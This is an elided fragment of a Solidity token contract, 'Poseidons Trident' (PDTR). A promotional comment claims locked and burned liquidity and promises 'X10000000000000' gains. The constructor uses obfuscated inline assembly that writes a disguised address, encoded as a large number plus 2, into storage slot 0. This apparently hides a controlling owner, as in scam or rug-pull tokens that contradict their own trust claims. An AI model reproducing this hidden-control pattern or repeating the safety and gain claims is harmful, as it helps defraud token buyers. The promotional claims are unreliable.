...
Telegram: https://t.me/PoseidonsTrident/
Twitter: https://twitter.com/PoseidonsTrident/
Website: https://PoseidonsTrident.finance
95% - LOCKED
5% for presale on PancakeSwap.
All liquidity Tokens burned!
New GEM!
Prepare to X10000000000000!
*/
...
contract PoseidonsTrident {
    string public constant name = "Poseidons Trident";
    string public constant symbol = "PDTR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(398012044529621708889238277595508162303413372903, 2))}
